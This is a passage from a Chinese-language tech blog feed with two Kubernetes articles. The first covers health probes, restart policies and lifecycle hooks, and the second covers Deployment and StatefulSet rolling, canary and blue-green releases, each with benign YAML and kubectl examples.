id="检查方式"><a href="#检查方式" class="headerlink" title="检查方式"></a>检查方式</h3><h4 id="Exec-方式"><a href="#Exec-方式" class="headerlink" title="Exec 方式"></a>Exec 方式</h4><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">livenessProbe:</span><br><span class="line">  exec:</span><br><span class="line">    command:</span><br><span class="line">    - cat</span><br><span class="line">    - /tmp/healthy</span><br></pre></td></tr></table></figure><h4 id="HTTP-GET-请求方式"><a href="#HTTP-GET-请求方式" class="headerlink" title="HTTP GET 请求方式"></a>HTTP GET 请求方式</h4><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">livenessProbe:</span><br><span class="line">  httpGet:</span><br><span class="line">    path: /healthz</span><br><span class="line">    port: 8080</span><br><span class="line">    httpHeaders:</span><br><span class="line">    - name: X-Custom-Header</span><br><span class="line">      value: Awesome</span><br></pre></td></tr></table></figure><p>支持的参数包括：</p><ul><li><code>host</code>: 目标主机地址，默认值为 pod IP</li><li><code>scheme</code>: HTTP 或 HTTPS，默认为 HTTP</li><li><code>path</code>: 访问路径</li><li><code>httpHeaders</code>: 自定义请求头</li><li><code>port</code>: 目标端口号，有效值 1~65535</li></ul><h4 id="TCP-Socket-方式"><a href="#TCP-Socket-方式" class="headerlink" title="TCP Socket 方式"></a>TCP Socket 方式</h4><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">livenessProbe:</span><br><span class="line">  tcpSocket:</span><br><span class="line">    port: 8080</span><br></pre></td></tr></table></figure><p>支持的参数包括：</p><ul><li><code>host</code>: 目标主机地址，默认值为 pod IP</li><li><code>port</code>: 目标端口号，有效值 1~65535</li></ul><h2 id="容器重启策略"><a href="#容器重启策略" class="headerlink" title="容器重启策略"></a>容器重启策略</h2><p><code>restartPolicy</code> 是 livenessProbe <code>Failure</code> 后执行的策略，作用于 Pod 的每个容器，可以配置为 <code>Always</code>、<code>OnFaiiure</code>、<code>Never</code>，默认值为 <code>Always</code>。</p><p><code>restartPolicy</code> 只会影响本机节点重启容器的策略，并不会影响 Pod 重新调度的行为，重启的方式按照时间间隔（10s, 20s, 40s, …, 5min）来重启容器，并且每 10min 重置间隔时间</p><p>重启策略 <code>restartPolicy</code> 的配置通过以下几个场景来举例说明：</p><ol><li>Pod Running 状态，包含 1 个容器，容器正常退出</li></ol><p>记录 completion 事件</p><ul><li><code>Always</code>: 重启容器，Pod phase 保持 <code>Running</code> 状态</li><li><code>OnFaiiure</code>: 不重启容器，Pod phase 变为 <code>Succeeded</code></li><li><code>Never</code>: 不重启容器，Pod phase 变为 <code>Succeeded</code></li></ul><ol start="2"><li>Pod Running 状态，包含 1 个容器，容器异常退出</li></ol><p>记录 failure 事件</p><ul><li><code>Always</code>: 重启容器，Pod phase 保持 <code>Running</code> 状态</li><li><code>OnFaiiure</code>: 重启容器，Pod phase 保持 <code>Running</code> 状态</li><li><code>Never</code>: 不重启容器，Pod phase 变为 <code>Failed</code></li></ul><ol start="3"><li>Pod Running 状态，包含 2 个容器，其中一个容器异常退出</li></ol><p>记录 failure 事件</p><ul><li><code>Always</code>: 重启容器，Pod phase 保持 <code>Running</code> 状态</li><li><code>OnFaiiure</code>: 重启容器，Pod phase 保持 <code>Running</code> 状态</li><li><code>Never</code>: 不重启容器，Pod phase 保持 <code>Running</code> 状态</li></ul><p>此时如果第二个容器退出（无论正常还是异常）</p><p>记录 failure 事件</p><ul><li><code>Always</code>: 重启容器，Pod phase 保持 <code>Running</code> 状态</li><li><code>OnFaiiure</code>: 重启容器，Pod phase 保持 <code>Running</code> 状态</li><li><code>Never</code>: 不重启容器，Pod phase 变为 <code>Failed</code></li></ul><ol start="4"><li>Pod Running 状态，包含 1 个容器，容器被 OOM (out of memory) killed</li></ol><p>记录 OOM 事件</p><ul><li><code>Always</code>: 重启容器，Pod phase 保持 <code>Running</code> 状态</li><li><code>OnFaiiure</code>: 重启容器，Pod phase 保持 <code>Running</code> 状态</li><li><code>Never</code>: 不重启容器，Pod phase 变为 <code>Failed</code></li></ul><ol start="5"><li>Pod Running 状态，遇到节点异常（比如磁盘挂掉、segmented out）</li></ol><p>根据异常原因记录相应事件</p><p>无论设置为哪种策略，Pod 状态变为 <code>Failed</code>，并尝试在其他节点重新创建（如果 Pod 是通过 Controller 管理的）</p><h2 id="容器生存周期事件处理"><a href="#容器生存周期事件处理" class="headerlink" title="容器生存周期事件处理"></a>容器生存周期事件处理</h2><p>k8s 在容器创建或终止时会发送 <code>postStart</code> 或 <code>preStop</code> 事件，用户可以通过配置 handler，对这两个容器事件进行处理。</p><p>k8s 在容器创建之后发送 <code>postStart</code> 事件，postStart handler 是异步执行，所以并不保证会在容器的 entrypoint 之前执行，不过容器代码会阻塞住直到 postStart handler 执行完成。执行成功后，容器状态才会设为 <code>Running</code></p><p>k8s 在容器 terminate 之前发送 <code>preStop</code> 事件，terminate 行为会阻塞，直到 preStop handler 同步执行成功或者 Pod 配置的 grace period 超时 (<code>terminationGracePeriodSeconds</code>)。注意：如果不是主动终止，k8s 不会发送 <code>preStop</code> 事件（比如正常退出）。</p><p>如果 postStart 或 preStop handler 执行失败，k8s 直接 kill 掉容器。</p><h3 id="handler-执行方式"><a href="#handler-执行方式" class="headerlink" title="handler 执行方式"></a>handler 执行方式</h3><h4 id="Exec-方式-1"><a href="#Exec-方式-1" class="headerlink" title="Exec 方式"></a>Exec 方式</h4><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">lifecycle:</span><br><span class="line">  postStart:</span><br><span class="line">    exec:</span><br><span class="line">      command: [&quot;/bin/sh&quot;, &quot;-c&quot;, &quot;echo Hello from the postStart handler &gt; /usr/share/message&quot;]</span><br></pre></td></tr></table></figure><h4 id="HTTP-GET-方式"><a href="#HTTP-GET-方式" class="headerlink" title="HTTP GET 方式"></a>HTTP GET 方式</h4><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">lifecycle:</span><br><span class="line">  postStart:</span><br><span class="line">    httpGet:</span><br><span class="line">      path: /healthz</span><br><span class="line">      port: 8080</span><br><span class="line">      httpHeaders:</span><br><span class="line">      - name: X-Custom-Header</span><br><span class="line">        value: Awesome</span><br></pre></td></tr></table></figure><h2 id="配置示例"><a href="#配置示例" class="headerlink" title="配置示例"></a>配置示例</h2><p>livenessProbe 和 readinessProbe 的配置项完全相同，只是检查失败后的行为不同</p><p>lifecycle 的 exec 和 httpGet 和 livenessProbe 对应的配置项相同。</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">apiVersion: v1</span><br><span class="line">kind: Pod</span><br><span class="line">metadata:</span><br><span class="line">  name: example</span><br><span class="line">spec:</span><br><span class="line">  containers:</span><br><span class="line">  - name: example</span><br><span class="line">    // ... </span><br><span class="line">    livenessProbe:</span><br><span class="line">      exec:</span><br><span class="line">        command:</span><br><span class="line">        - cat</span><br><span class="line">        - /tmp/healthy</span><br><span class="line">      initialDelaySeconds: 5</span><br><span class="line">      periodSeconds: 10</span><br><span class="line">    readinessProbe:</span><br><span class="line">      tcpSocket:</span><br><span class="line">        port: 8080</span><br><span class="line">      initialDelaySeconds: 10</span><br><span class="line">      periodSeconds: 10</span><br><span class="line">    lifecycle:</span><br><span class="line">      postStart:</span><br><span class="line">        exec:</span><br><span class="line">          command: [&quot;/bin/sh&quot;, &quot;-c&quot;, &quot;echo Hello from the postStart handler &gt; /usr/share/message&quot;]</span><br><span class="line">      preStop:</span><br><span class="line">        httpGet:</span><br><span class="line">          host: xxx.xxx.xxx</span><br><span class="line">          path: /stop</span><br><span class="line">          port: 8080</span><br><span class="line">  restartPolicy: OnFailure</span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>Pod 生命周期：<a href="https://kubernetes.io/docs/concepts/workloads/pods/pod-lifecycle/" target="_blank" rel="noopener">https://kubernetes.io/docs/concepts/workloads/pods/pod-lifecycle/</a></p><p>健康检查和就绪检查：<a href="https://kubernetes.io/docs/tasks/configure-pod-container/configure-liveness-readiness-probes/" target="_blank" rel="noopener">https://kubernetes.io/docs/tasks/configure-pod-container/configure-liveness-readiness-probes/</a></p><p>容器生存周期事件处理：<br><a href="https://kubernetes.io/docs/tasks/configure-pod-container/attach-handler-lifecycle-event/" target="_blank" rel="noopener">https://kubernetes.io/docs/tasks/configure-pod-container/attach-handler-lifecycle-event/</a><br><a href="https://kubernetes.io/docs/concepts/containers/container-lifecycle-hooks/" target="_blank" rel="noopener">https://kubernetes.io/docs/concepts/containers/container-lifecycle-hooks/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 原创 </tag>
            
            <tag> 云计算 </tag>
            
            <tag> Kubernetes </tag>
            
            <tag> K8S </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kubernetes 服务灰度升级最佳实践</title>
      <link href="/hexo-blog/20180301/Kubernetes-%E6%9C%8D%E5%8A%A1%E7%81%B0%E5%BA%A6%E5%8D%87%E7%BA%A7%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5/"/>
      <url>/hexo-blog/20180301/Kubernetes-%E6%9C%8D%E5%8A%A1%E7%81%B0%E5%BA%A6%E5%8D%87%E7%BA%A7%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5/</url>
      
        <content type="html"><![CDATA[<p>本文主要介绍了 Deployment 和 StatefulSet 的升级机制和扩缩容机制，以及一些常用的配置项。并分别介绍了以这两种方式部署 Pod 时的对服务进行升级（包括滚动发布、蓝绿发布、灰度／金丝雀发布）的最佳实践。</p><h2 id="Deployment"><a href="#Deployment" class="headerlink" title="Deployment"></a>Deployment</h2><h3 id="升级机制"><a href="#升级机制" class="headerlink" title="升级机制"></a>升级机制</h3><h4 id="Rollout"><a href="#Rollout" class="headerlink" title="Rollout"></a>Rollout</h4><p>Deployment 的 rollout 在 .spec.template 被修改时触发（比如镜像地址更新、Pod label 更新等等），其他修改（.spec.replicas 更新）不会触发。</p><p>更新时，k8s 通过计算 pod-template-hash，创建新的 ReplicaSet，由新的 rs 启动新的 Pod，不断替换旧 rs 的 Pod。</p><a id="more"></a><p>通过命令</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl -n &lt;namespace&gt; rollout status deployment/&lt;deployment-name&gt;</span><br></pre></td></tr></table></figure><p>查看 Deployment rollout 的状态。</p><p><code>.spec.strategy</code> 定义了更新 Pod 的策略：</p><figure class="highlight yaml hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attr">minReadySeconds:</span> <span class="hljs-number">5</span></span><br><span class="line"><span class="hljs-attr">strategy:</span></span><br><span class="line"><span class="hljs-attr">  type:</span> <span class="hljs-string">RollingUpdate</span></span><br><span class="line"><span class="hljs-attr">  rollingUpdate:</span></span><br><span class="line"><span class="hljs-attr">    maxSurge:</span> <span class="hljs-number">1</span></span><br><span class="line"><span class="hljs-attr">    maxUnavailable:</span> <span class="hljs-number">1</span></span><br></pre></td></tr></table></figure><ul><li><code>spec.strategy.type</code> 可以为 Recreate 或 RollingUpdate。Recreate 先删掉旧 Pod 再创建新 Pod，RollingUpdate 则按照滚动升级的策略来更新。</li><li><code>maxUnavailable</code>：更新时，Deployment 确保不超过 25%（默认值） 的 Pod 处于 unavailable 状态。既可以是数量也可以是百分比，当 <code>maxSurge</code> 为 <code>0</code> 时 <code>maxUnavailable</code> 不能为 <code>0</code>。</li><li><code>maxSurge</code>：更新时，Deployment 确保当前实际创建的 Pod 数（包括新旧实例总和）不超过期望 Pod 数的 25%（默认值）。既可以是数量也可以是百分比。</li><li><code>minReadySeconds</code>：新创建的 Pod 变为 Ready 状态的最少时间，如果容器在该时间内没有 crash，则认为该 Pod 是 available 的。默认值为 0，表示一旦 readiness probe 通过后就变为 Ready，这时如果没有配置 <code>readinessProbe</code>，则只要 Pod 创建后就会为 Ready 状态，可能会导致服务不可用。</li></ul><h4 id="Rollover"><a href="#Rollover" class="headerlink" title="Rollover"></a>Rollover</h4><p>当 Deployment 在 rollout 过程中被更新时，Deployment 会立即执行新的更新，停止之前的 rollout 动作，并根据期望实例数删除（缩容）之前的 Pod，这个过程叫做 rollover。</p><h4 id="Rollback"><a href="#Rollback" class="headerlink" title="Rollback"></a>Rollback</h4><p>获取 Deployment 的 rollout 历史，最新的 revision 即当前版本</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl -n &lt;namespace&gt; rollout history deployment/&lt;deployment-name&gt;</span><br></pre></td></tr></table></figure><p>查看指定 revision 的详细信息</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl -n &lt;namespace&gt; rollout history deployment/&lt;deployment-name&gt; --revision=&lt;revision_num&gt;</span><br></pre></td></tr></table></figure><p>回滚到上一个版本</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl -n &lt;namespace&gt; rollout undo deployment/&lt;deployment-name&gt;</span><br></pre></td></tr></table></figure><p>回滚到指定版本</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl -n &lt;namespace&gt; rollout undo deployment/&lt;deployment-name&gt; --to-revision=&lt;revision_num&gt;</span><br></pre></td></tr></table></figure><p>当 Deployment 回滚成功时，会生成 DeploymentRollback 事件</p><p>可以通过 <code>.spec.revisionHistoryLimit</code> 配置最多保留的 revision 历史个数（不包括当前版本），默认值为 2，即保留 3 个 revision。</p><h4 id="Pause-Resume"><a href="#Pause-Resume" class="headerlink" title="Pause/Resume"></a>Pause/Resume</h4><p>当 Deployment 的 <code>.spec.paused = true</code> 时，任何更新都不会被触发 rollout。通过如下命令设置 Deployment 为 paused：</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl -n &lt;namespace&gt; rollout pause deployment/&lt;deployment-name&gt;</span><br></pre></td></tr></table></figure><p>还原：</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl -n &lt;namespace&gt; rollout resume deploy/&lt;deployment-name&gt;</span><br></pre></td></tr></table></figure><h3 id="扩缩容机制"><a href="#扩缩容机制" class="headerlink" title="扩缩容机制"></a>扩缩容机制</h3><h4 id="手动扩缩容"><a href="#手动扩缩容" class="headerlink" title="手动扩缩容"></a>手动扩缩容</h4><p>可以通过修改 <code>.spec.replicas</code>，或者执行 kubectl 命令的方式对 Deployment 进行扩缩容：</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl scale deployment nginx-deployment --replicas=10</span><br></pre></td></tr></table></figure><h4 id="自动扩缩容"><a href="#自动扩缩容" class="headerlink" title="自动扩缩容"></a>自动扩缩容</h4><p>k8s 支持通过创建 HorizontalPodAutoscaler，根据 CPU 利用率或者服务提供的 metrics，对 Deployment、Replication Controller 或者 ReplicaSet 进行自动扩缩容。</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl autoscale deployment nginx-deployment --min=10 --max=15 --cpu-percent=80</span><br></pre></td></tr></table></figure><p>详细请参考：</p><p><a href="https://kubernetes.io/docs/tasks/run-application/horizontal-pod-autoscale/" target="_blank" rel="noopener">https://kubernetes.io/docs/tasks/run-application/horizontal-pod-autoscale/</a></p><p><a href="https://kubernetes.io/docs/tasks/run-application/horizontal-pod-autoscale-walkthrough/" target="_blank" rel="noopener">https://kubernetes.io/docs/tasks/run-application/horizontal-pod-autoscale-walkthrough/</a></p><h3 id="发布最佳实践"><a href="#发布最佳实践" class="headerlink" title="发布最佳实践"></a>发布最佳实践</h3><h4 id="滚动发布"><a href="#滚动发布" class="headerlink" title="滚动发布"></a>滚动发布</h4><p>滚动发布是 Deployment 默认支持的更新方式，除了上文介绍的 rollingUpdate 相关配置外，不需要其他特殊的配置工作，</p><h4 id="灰度／金丝雀发布"><a href="#灰度／金丝雀发布" class="headerlink" title="灰度／金丝雀发布"></a>灰度／金丝雀发布</h4><p>金丝雀发布通过同时创建两个 Deployments 来实现，通过 track 标签区分两个版本，稳定版本的 Deployment 定义如下：</p><figure class="highlight yaml hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attr">name:</span> <span class="hljs-string">frontend</span></span><br><span class="line"><span class="hljs-attr">replicas:</span> <span class="hljs-number">3</span></span><br><span class="line"><span class="hljs-string">...</span></span><br><span class="line"><span class="hljs-attr">labels:</span></span><br><span class="line"><span class="hljs-attr">   app:</span> <span class="hljs-string">guestbook</span></span><br><span class="line"><span class="hljs-attr">   tier:</span> <span class="hljs-string">frontend</span></span><br><span class="line"><span class="hljs-attr">   track:</span> <span class="hljs-string">stable</span></span><br><span class="line"><span class="hljs-string">...</span></span><br><span class="line"><span class="hljs-attr">image:</span> <span class="hljs-attr">gb-frontend:v3</span></span><br></pre></td></tr></table></figure><p>金丝雀版本的定义如下：</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">name: frontend-canary</span><br><span class="line">replicas: 1</span><br><span class="line">...</span><br><span class="line">labels:</span><br><span class="line">   app: guestbook</span><br><span class="line">   tier: frontend</span><br><span class="line">   track: canary</span><br><span class="line">...</span><br><span class="line">image: gb-frontend:v4</span><br></pre></td></tr></table></figure><p>再配置 service 的 labelSelector 将流量同时导入两个版本的 Pod</p><figure class="highlight yaml hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attr">selector:</span></span><br><span class="line"><span class="hljs-attr">  app:</span> <span class="hljs-string">guestbook</span></span><br><span class="line"><span class="hljs-attr">  tier:</span> <span class="hljs-string">frontend</span></span><br></pre></td></tr></table></figure><p>通过 <code>.spec.replicas</code> 数量和扩缩容机制可以灵活配置稳定版本和金丝雀版本的比例（上面的例子为 3:1），流量会按照这个比例转发至不同版本，一旦线上测试无误后，将 track = stable 的 Deployment 更新为新版本镜像，再删除 track = canary 的 Deployment 即可。</p><h4 id="蓝绿发布"><a href="#蓝绿发布" class="headerlink" title="蓝绿发布"></a>蓝绿发布</h4><p>与金丝雀发布类似，同时创建 2 个label 不同的 Deployment，例如，deployment-1 定义如下：</p><figure class="highlight yaml hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attr">name:</span> <span class="hljs-string">frontend</span></span><br><span class="line"><span class="hljs-attr">replicas:</span> <span class="hljs-number">3</span></span><br><span class="line"><span class="hljs-string">...</span></span><br><span class="line"><span class="hljs-attr">labels:</span></span><br><span class="line"><span class="hljs-attr">   app:</span> <span class="hljs-string">guestbook</span></span><br><span class="line"><span class="hljs-attr">   tier:</span> <span class="hljs-string">frontend</span></span><br><span class="line"><span class="hljs-attr">   version:</span> <span class="hljs-string">v3</span></span><br><span class="line"><span class="hljs-string">...</span></span><br><span class="line"><span class="hljs-attr">image:</span> <span class="hljs-attr">gb-frontend:v3</span></span><br></pre></td></tr></table></figure><p>deployment-2 定义如下：</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">name: frontend</span><br><span class="line">replicas: 3</span><br><span class="line">...</span><br><span class="line">labels:</span><br><span class="line">   app: guestbook</span><br><span class="line">   tier: frontend</span><br><span class="line">   version: v4</span><br><span class="line">...</span><br><span class="line">image: gb-frontend:v4</span><br></pre></td></tr></table></figure><p>金丝雀发布通过修改 Deployment 的 replicas 数量和 Pod 镜像地址实现流量切换，而蓝绿发布通过修改 Service 的 labelSelector 实现流量切换。</p><p>原 service 定义如下：</p><figure class="highlight yaml hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attr">selector:</span></span><br><span class="line"><span class="hljs-attr">  app:</span> <span class="hljs-string">guestbook</span></span><br><span class="line"><span class="hljs-attr">  tier:</span> <span class="hljs-string">frontend</span></span><br><span class="line"><span class="hljs-attr">  version:</span> <span class="hljs-string">v3</span></span><br></pre></td></tr></table></figure><p>切量时修改为：</p><figure class="highlight yaml hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attr">selector:</span></span><br><span class="line"><span class="hljs-attr">  app:</span> <span class="hljs-string">guestbook</span></span><br><span class="line"><span class="hljs-attr">  tier:</span> <span class="hljs-string">frontend</span></span><br><span class="line"><span class="hljs-attr">  version:</span> <span class="hljs-string">v4</span></span><br></pre></td></tr></table></figure><h2 id="StatefulSet"><a href="#StatefulSet" class="headerlink" title="StatefulSet"></a>StatefulSet</h2><p>StatefulSet 相对于 Deployment，具有以下特点：</p><ul><li>稳定：唯一的 Pod 名称，唯一的网络ID，持久化存储</li><li>有序：部署和伸缩都按照顺序执行，滚动升级按照顺序执行</li></ul><h3 id="升级机制-1"><a href="#升级机制-1" class="headerlink" title="升级机制"></a>升级机制</h3><ul><li><code>.spec.updateStrategy</code> 定义了升级 StatefulSet 的 Pod 的行为</li><li><code>.spec.updateStrategy.type</code> 为 OnDelete （默认行为）时，用户手动删除 Pod 后，新的 Pod 才会创建；为 RollingUpdate 时，k8s 按照 {N-1 .. 0} 的顺序滚动更新每个 Pod。</li><li><code>.spec.updateStrategy.rollingUpdate.partition</code> 可以实现灰度发布，当 StatefulSet 更新时，所有序号大于或等于 partition 的 Pod 会滚动更新；所有序号小于 partition 的 Pod 不会更新，即使被删掉，也会创建旧版本的 Pod。当 partition 大于 replicas 时，任何 Pod 都不会被更新。</li></ul><p>配置示例如下：</p><figure class="highlight yaml hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attr">spec:</span></span><br><span class="line"><span class="hljs-attr">  replicas:</span> <span class="hljs-number">10</span></span><br><span class="line"><span class="hljs-attr">  updateStrategy:</span></span><br><span class="line"><span class="hljs-attr">    type:</span> <span class="hljs-string">RollingUpdate</span></span><br><span class="line"><span class="hljs-attr">    rollingUpdate:</span></span><br><span class="line"><span class="hljs-attr">      partition:</span> <span class="hljs-number">7</span>  <span class="hljs-comment"># 7, 8, 9 will be rolling updated</span></span><br></pre></td></tr></table></figure><p>StatefulSet 也支持 <code>kubectl rollout</code> 命令，使用方法同 Deployment。</p><h3 id="扩缩容机制-1"><a href="#扩缩容机制-1" class="headerlink" title="扩缩容机制"></a>扩缩容机制</h3><p>可以通过 <code>spec.podManagementPolicy</code> 来配置 StatefulSet 的扩缩容策略</p><figure class="highlight yaml hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attr">spec:</span></span><br><span class="line"><span class="hljs-attr">  podManagementPolicy:</span> <span class="hljs-string">OrderdReady</span></span><br></pre></td></tr></table></figure><h4 id="OrderedReady"><a href="#OrderedReady" class="headerlink" title="OrderedReady"></a>OrderedReady</h4><p>默认行为</p><p>扩容时，Pod 按照 {0 .. N-1} 依次创建，并且前一个 Running／Ready 之后，后一个才会创建</p><p>缩容时，Pod 按照 {N-1 .. 0} 依次删除，前一个完全删除之后，后一个才会开始删除</p><h4 id="Parallel"><a href="#Parallel" class="headerlink" title="Parallel"></a>Parallel</h4><p>扩缩容时忽略顺序，并发创建或删除</p><p>注意，该配置仅仅对扩缩容（修改 replicas）的情况有效，升级 StatefulSet 时 k8s 依然按照次序来更新 Pod。</p><h3 id="唯一网络-ID"><a href="#唯一网络-ID" class="headerlink" title="唯一网络 ID"></a>唯一网络 ID</h3><p>每个 Pod 都有唯一的 hostname，格式为<statefulset-name>-<pod 序号>，domain name 的格式为<headless-svc-name>.<namespace>.svc.cluster.local，通过该 domain name 可以解析到 StatefulSet 下所有的 Pod。通过<statefulset-name>-<pod 序号>.<headless-svc-name>.<namespace>.svc.cluster.local 可以解析到指定 Pod。</namespace></headless-svc-name></pod></statefulset-name></namespace></headless-svc-name></pod></statefulset-name></p><h3 id="稳定存储"><a href="#稳定存储" class="headerlink" title="稳定存储"></a>稳定存储</h3><p>通过配置 StatefulSet 的 <code>volumeClaimTemplates</code>，k8s 会为每个 Pod 创建 PV 和 PVC 并绑定。当 Pod 删除时，对应的 PVC 不会被删除，当重新创建时，仍然会绑定到之前的 PV。</p><figure class="highlight yaml hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attr">volumeClaimTemplates:</span></span><br><span class="line"><span class="hljs-attr">- metadata:</span></span><br><span class="line"><span class="hljs-attr">    name:</span> <span class="hljs-string">www</span></span><br><span class="line"><span class="hljs-attr">  spec:</span></span><br><span class="line"><span class="hljs-attr">    accessModes:</span> <span class="hljs-string">[</span> <span class="hljs-string">"ReadWriteOnce"</span> <span class="hljs-string">]</span></span><br><span class="line"><span class="hljs-attr">    storageClassName:</span> <span class="hljs-string">"my-storage-class"</span></span><br><span class="line"><span class="hljs-attr">    resources:</span></span><br><span class="line"><span class="hljs-attr">      requests:</span></span><br><span class="line"><span class="hljs-attr">        storage:</span> <span class="hljs-number">1</span><span class="hljs-string">Gi</span></span><br></pre></td></tr></table></figure><h3 id="发布最佳实践-1"><a href="#发布最佳实践-1" class="headerlink" title="发布最佳实践"></a>发布最佳实践</h3><h4 id="滚动发布-1"><a href="#滚动发布-1" class="headerlink" title="滚动发布"></a>滚动发布</h4><p>滚动发布需要配置 <code>.spec.updateStrategy.type</code> 为 <code>RollingUpdate</code>，StatefulSet 的默认行为是按照 {N-1 .. 0} 的顺序依次更新。</p><figure class="highlight yaml hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attr">spec:</span></span><br><span class="line"><span class="hljs-attr">  updateStrategy:</span></span><br><span class="line"><span class="hljs-attr">    type:</span> <span class="hljs-string">RollingUpdate</span></span><br></pre></td></tr></table></figure><h4 id="蓝绿发布-1"><a href="#蓝绿发布-1" class="headerlink" title="蓝绿发布"></a>蓝绿发布</h4><p>蓝绿发布与 Deployment 的方式相同，通过创建 2 个 StatefulSet，修改 Service 的方式实现切量。</p><h4 id="灰度／金丝雀发布-1"><a href="#灰度／金丝雀发布-1" class="headerlink" title="灰度／金丝雀发布"></a>灰度／金丝雀发布</h4><p>金丝雀发布通过修改 StatefulSet 的 <code>.spec.updateStrategy.rollingUpdate.partition</code> 的值来实现发布。</p><p>例如 replicas 为 10 时，Pod 的序号为 0 - 9，首先将 partition 设置为 7，再修改 StatefulSet 的 Pod template 配置，会依次触发 Pod 9, 8, 7 的滚动更新，Pod 0-6 